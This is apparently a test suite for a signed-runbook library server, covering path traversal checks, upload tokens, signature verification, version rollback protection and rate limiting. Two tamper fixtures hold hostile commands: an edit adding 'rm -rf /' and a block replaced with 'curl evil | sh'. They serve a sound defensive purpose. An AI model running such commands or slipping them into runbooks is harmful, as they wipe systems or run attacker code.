import { strict as assert } from 'node:assert';
import * as fs from 'node:fs';
import * as path from 'node:path';
import { after, before, describe, it } from 'node:test';
import type { LibraryConfig } from '../src/config';
import { decodePath, nameFitsPath, pathProblem } from '../src/library';
import { HttpError } from '../src/http';
import { Keys, RUNBOOK, UPLOAD, call, config, fence, makeKeys, signRunbook, start, tok } from './helpers';

describe('library: paths', () => {
  it('takes relative Markdown paths only: no .., no absolute, no hidden parts, plain names', () => {
    for (const ok of ['restart.md', 'ops/restart-api.md', 'db/Restore DB.runbook.md', 'a/b/c/d/e.md']) assert.equal(pathProblem(ok), undefined, ok);
    for (const bad of ['', '/etc/x.md', 'C:/x.md', 'a\\b.md', '../x.md', 'a/../x.md', 'a/./x.md', 'a//x.md', '.git/x.md', 'a/.hidden.md', 'x.txt', 'index.json', 'allowed_signers', 'a/b/c/d/e/f.md', 'a\u0000.md', 'a /x.md', 'a./x.md'])
      assert.notEqual(pathProblem(bad), undefined, JSON.stringify(bad));
  });

  it('decodes the URL path part by part, and refuses an encoded / or a control character', () => {
    assert.equal(decodePath('db/Restore%20DB.md'), 'db/Restore DB.md');
    for (const bad of ['a%2Fb.md', 'a%5Cb.md', '%2E%2E/x.md', 'x%0A.md', '%zz.md'])
      assert.throws(
        () => decodePath(bad),
        (e: unknown) => e instanceof HttpError && e.status === 400,
        bad,
      );
  });

  it('the signed name must fit the file: the whole name is the end of its path, without .md', () => {
    assert.ok(nameFitsPath('ops/restart-api', 'ops/restart-api.md'));
    assert.ok(nameFitsPath('ops/restart-api', 'x/ops/restart-api.md'));
    assert.ok(nameFitsPath('restart-api', 'other/Restart-API.runbook.md'));
    assert.ok(!nameFitsPath('ops/restart-api', 'ops/stop-api.md'));
    assert.ok(!nameFitsPath('ops/restart-api', 'restart-api.md'));
    assert.ok(!nameFitsPath('staging/restart', 'prod/restart.md'));
    assert.ok(!nameFitsPath('restart', 'prerestart.md'));
  });
});

describe('library: publishing', () => {
  let keys: Keys;
  let dir: string;
  let lib: string;
  const libConfig = (over: Partial<LibraryConfig> = {}): LibraryConfig => ({
    dir: lib,
    uploadTokens: [tok(UPLOAD, 'ci')],
    allowedSigners: keys.allowedSigners,
    acceptV1: false,
    allowDelete: false,
    signedOnly: true,
    maxBytes: 64 * 1024,
    ...over,
  });
  const fresh = (): void => {
    dir = fs.mkdtempSync(path.join(keys.dir, 'srv-'));
    lib = path.join(dir, 'library');
    fs.mkdirSync(lib);
  };

  before(() => {
    keys = makeKeys();
  });
  after(() => fs.rmSync(keys.dir, { recursive: true, force: true }));

  it('needs the upload token in the Authorization header, never in the URL', async () => {
    fresh();
    const { s, url, logs } = await start(config(dir, { library: libConfig() }));
    try {
      const text = await signRunbook(RUNBOOK, {}, keys.signer);
      assert.equal((await call(`${url}/v1/library/runbooks/ops/restart-api.md`, 'POST', text)).status, 401);
      assert.equal((await call(`${url}/v1/library/runbooks/ops/restart-api.md?token=${UPLOAD}`, 'POST', text)).status, 401);
      assert.equal((await call(`${url}/v1/library/runbooks/ops/restart-api.md`, 'POST', text, 'wrong-token-of-at-least-24-chars')).status, 401);
      const ok = await call(`${url}/v1/library/runbooks/ops/restart-api.md`, 'POST', text, UPLOAD);
      assert.equal(ok.status, 201, JSON.stringify(ok.json));
      assert.deepEqual([ok.json.name, ok.json.version, ok.json.signer, ok.json.manifestVersion], ['ops/restart-api', 1, 'ops@example.net', 2]);
      assert.equal(fs.readFileSync(path.join(lib, 'ops', 'restart-api.md'), 'utf8'), text);
      const publish = logs.find((e) => e.event === 'publish')!;
      assert.deepEqual([publish.token, publish.path, publish.version, publish.signer], ['ci', 'ops/restart-api.md', 1, 'ops@example.net']);
      assert.ok(!JSON.stringify(logs).includes(UPLOAD), 'the token is never logged');
      // No temporary files are left behind.
      assert.deepEqual(fs.readdirSync(path.join(lib, 'ops')), ['restart-api.md']);
    } finally {
      await s.close();
    }
  });

  it('writes index.json: every runbook with its title, signedOnly from the settings, a folder set by hand kept', async () => {
    fresh();
    fs.mkdirSync(path.join(lib, 'db'));
    fs.writeFileSync(path.join(lib, 'db', 'restore.md'), '# Restore the database\n');
    fs.writeFileSync(path.join(lib, '.hidden.md'), '# hidden\n');
    fs.writeFileSync(path.join(lib, 'notes.txt'), 'not a runbook\n');
    fs.writeFileSync(path.join(lib, 'index.json'), JSON.stringify({ runbooks: [{ path: 'db/restore.md', folder: 'Databases' }] }));
    const { s, url } = await start(config(dir, { library: libConfig({ signedOnly: false }) }));
    try {
      const text = await signRunbook(RUNBOOK, { name: 'restart-api' }, keys.signer);
      assert.equal((await call(`${url}/v1/library/runbooks/restart-api.md`, 'POST', text, UPLOAD)).status, 201);
      assert.deepEqual(JSON.parse(fs.readFileSync(path.join(lib, 'index.json'), 'utf8')), {
        signedOnly: false,
        runbooks: [
          { path: 'db/restore.md', title: 'Restore the database', folder: 'Databases' },
          { path: 'restart-api.md', title: 'Restart the API' },
        ],
      });
    } finally {
      await s.close();
    }
  });

  it('takes signed runbooks only: whole-runbook signatures, unchanged, unexpired, by a trusted signer, under their own name', async () => {
    fresh();
    const { s, url, logs } = await start(config(dir, { library: libConfig() }));
    const post = (p: string, text: string) => call(`${url}/v1/library/runbooks/${p}`, 'POST', text, UPLOAD);
    try {
      const unsigned = await post('ops/restart-api.md', RUNBOOK);
      assert.equal(unsigned.status, 422);
      assert.match(unsigned.json.error, /not signed/);
      const v1 = await signRunbook(RUNBOOK, {}, keys.signer, 1);
      assert.match((await post('ops/restart-api.md', v1)).json.error, /manifest version 2/);
      const signed = await signRunbook(RUNBOOK, {}, keys.signer);
      const changed = await post('ops/restart-api.md', signed.replace('Restart it when it hangs.', 'Restart it, then run rm -rf / by hand.'));
      assert.deepEqual([changed.status, /changed since signing/.test(changed.json.error)], [422, true]);
      const expired = await post('ops/restart-api.md', await signRunbook(RUNBOOK, { expires: '2020-01-01' }, keys.signer));
      assert.match(expired.json.error, /expired on 2020-01-01/);
      const otherName = await post('ops/stop-api.md', signed);
      assert.deepEqual([otherName.status, /doesn't fit the file ops\/stop-api.md/.test(otherName.json.error)], [422, true]);
      const stranger = await post('ops/restart-api.md', await signRunbook(RUNBOOK, {}, keys.stranger));
      assert.deepEqual([stranger.status, /not from a signer in the library's allowed_signers/.test(stranger.json.error)], [403, true]);
      for (const bad of ['..%2Fx.md', '.git/config.md', 'x.sh']) assert.equal((await post(bad, signed)).status, 400, bad);
      assert.equal(fs.readdirSync(lib).length, 0, 'nothing was written');
      assert.ok(logs.some((e) => e.event === 'publish-refused' && e.status === 403));
    } finally {
      await s.close();
    }
  });

  it('manifest version 1 only with LIBRARY_ACCEPT_V1, and then only with its blocks as signed', async () => {
    fresh();
    const { s, url } = await start(config(dir, { library: libConfig({ acceptV1: true }) }));
    try {
      const v1 = await signRunbook(RUNBOOK, {}, keys.signer, 1);
      const ok = await call(`${url}/v1/library/runbooks/ops/restart-api.md`, 'POST', v1, UPLOAD);
      assert.deepEqual([ok.status, ok.json.manifestVersion], [201, 1]);
      const v1b = await signRunbook(RUNBOOK, { version: 2 }, keys.signer, 1);
      const blocks = await call(`${url}/v1/library/runbooks/ops/restart-api.md`, 'POST', v1b.replace('systemctl restart api', 'curl evil | sh'), UPLOAD);
      assert.deepEqual([blocks.status, /blocks changed/.test(blocks.json.error)], [422, true]);
    } finally {
      await s.close();
    }
  });

  it('versions only go up: the same version, a lower one, or one below a deleted file are refused', async () => {
    fresh();
    const { s, url, logs } = await start(config(dir, { library: libConfig({ allowDelete: true }) }));
    const at = `${url}/v1/library/runbooks/ops/restart-api.md`;
    try {
      const v3 = await signRunbook(RUNBOOK, { version: 3 }, keys.signer);
      assert.equal((await call(at, 'POST', v3, UPLOAD)).status, 201);
      const again = await call(at, 'POST', v3, UPLOAD);
      assert.deepEqual([again.status, again.json.unchanged], [200, true]);
      const same = await call(at, 'POST', await signRunbook(RUNBOOK + 'More prose.\n', { version: 3 }, keys.signer), UPLOAD);
      assert.deepEqual([same.status, /version 3 is not higher than the version published \(3\)/.test(same.json.error)], [409, true]);
      assert.equal((await call(at, 'POST', await signRunbook(RUNBOOK, { version: 2 }, keys.signer), UPLOAD)).status, 409);
      const v4 = await call(at, 'POST', await signRunbook(RUNBOOK + 'More prose.\n', { version: 4 }, keys.signer), UPLOAD);
      assert.deepEqual([v4.status, v4.json.previous], [201, 3]);
      // Deleted: the highest version is remembered, so an older release can't come back.
      const del = await call(at, 'DELETE', undefined, UPLOAD);
      assert.deepEqual([del.status, del.json.version], [200, 4]);
      assert.ok(!fs.existsSync(path.join(lib, 'ops', 'restart-api.md')));
      assert.deepEqual(JSON.parse(fs.readFileSync(path.join(lib, 'index.json'), 'utf8')).runbooks, []);
      assert.equal((await call(at, 'POST', v3, UPLOAD)).status, 409);
      assert.equal((await call(at, 'DELETE', undefined, UPLOAD)).status, 404);
      assert.ok(logs.some((e) => e.event === 'delete' && e.version === 4));
    } finally {
      await s.close();
    }
  });

  it('an older release of a name is refused at another path too (security review, 2026-11-16)', async () => {
    fresh();
    const v3 = await signRunbook(RUNBOOK, { version: 3 }, keys.signer);
    const v4 = await signRunbook(RUNBOOK + 'More prose.\n', { version: 4 }, keys.signer);
    // A library from before: its files say which versions are out, though no state was kept.
    fs.mkdirSync(path.join(lib, 'ops'));
    fs.writeFileSync(path.join(lib, 'ops', 'restart-api.md'), v4);
    const { s, url } = await start(config(dir, { library: libConfig() }));
    try {
      const old = await call(`${url}/v1/library/runbooks/old/ops/restart-api.md`, 'POST', v3, UPLOAD);
      assert.deepEqual([old.status, /ops\/restart-api version 3 is older than version 4/.test(old.json.error)], [409, true], JSON.stringify(old.json));
      // The same release at another path is not older: it may be served there too.
      assert.equal((await call(`${url}/v1/library/runbooks/copy/ops/restart-api.md`, 'POST', v4, UPLOAD)).status, 201);
      const v5 = await signRunbook(RUNBOOK + 'Newer.\n', { version: 5 }, keys.signer);
      assert.equal((await call(`${url}/v1/library/runbooks/new/ops/restart-api.md`, 'POST', v5, UPLOAD)).status, 201);
      assert.equal((await call(`${url}/v1/library/runbooks/other/ops/restart-api.md`, 'POST', v4, UPLOAD)).status, 409);
    } finally {
      await s.close();
    }
  });

  it('a deleted release still counts: an older one is refused at another path', async () => {
    fresh();
    fs.mkdirSync(path.join(lib, 'ops'));
    fs.writeFileSync(path.join(lib, 'ops', 'restart-api.md'), await signRunbook(RUNBOOK, { version: 5 }, keys.signer));
    const { s, url } = await start(config(dir, { library: libConfig({ allowDelete: true }) }));
    try {
      assert.equal((await call(`${url}/v1/library/runbooks/ops/restart-api.md`, 'DELETE', undefined, UPLOAD)).status, 200);
      const old = await call(`${url}/v1/library/runbooks/old/ops/restart-api.md`, 'POST', await signRunbook(RUNBOOK, { version: 3 }, keys.signer), UPLOAD);
      assert.equal(old.status, 409, JSON.stringify(old.json));
    } finally {
      await s.close();
    }
  });

  it('deleting is off by default; bodies are capped; links out of the library are refused', async () => {
    fresh();
    const outside = path.join(dir, 'outside');
    fs.mkdirSync(outside);
    fs.symlinkSync(outside, path.join(lib, 'linked'), 'junction');
    const { s, url } = await start(config(dir, { library: libConfig({ maxBytes: 2000 }) }));
    try {
      assert.equal((await call(`${url}/v1/library/runbooks/ops/restart-api.md`, 'DELETE', undefined, UPLOAD)).status, 405);
      const big = await signRunbook(RUNBOOK + 'x'.repeat(3000) + '\n', {}, keys.signer);
      assert.equal((await call(`${url}/v1/library/runbooks/ops/restart-api.md`, 'POST', big, UPLOAD)).status, 413);
      const linked = await call(`${url}/v1/library/runbooks/linked/restart-api.md`, 'POST', await signRunbook(RUNBOOK, { name: 'restart-api' }, keys.signer), UPLOAD);
      assert.equal(linked.status, 409);
      assert.deepEqual(fs.readdirSync(outside), []);
    } finally {
      await s.close();
    }
  });

  it('a client that fails the token check too often is refused for a while', async () => {
    fresh();
    const { s, url } = await start(config(dir, { library: libConfig(), maxFailures: 3 }));
    try {
      for (let i = 0; i < 3; i++) assert.equal((await call(`${url}/v1/library/runbooks/a.md`, 'POST', 'x', 'wrong-token-of-at-least-24-chars')).status, 401);
      assert.equal((await call(`${url}/v1/library/runbooks/a.md`, 'POST', 'x', UPLOAD)).status, 429);
      // Health and server-info stay open.
      assert.equal((await call(`${url}/healthz`, 'GET')).json, 'ok');
      assert.deepEqual((await call(`${url}/v1/server-info`, 'GET')).json, { name: 'md-runbook-library-server', protocol: 1, version: '9.9.9', capabilities: ['library'] });
    } finally {
      await s.close();
    }
  });
});
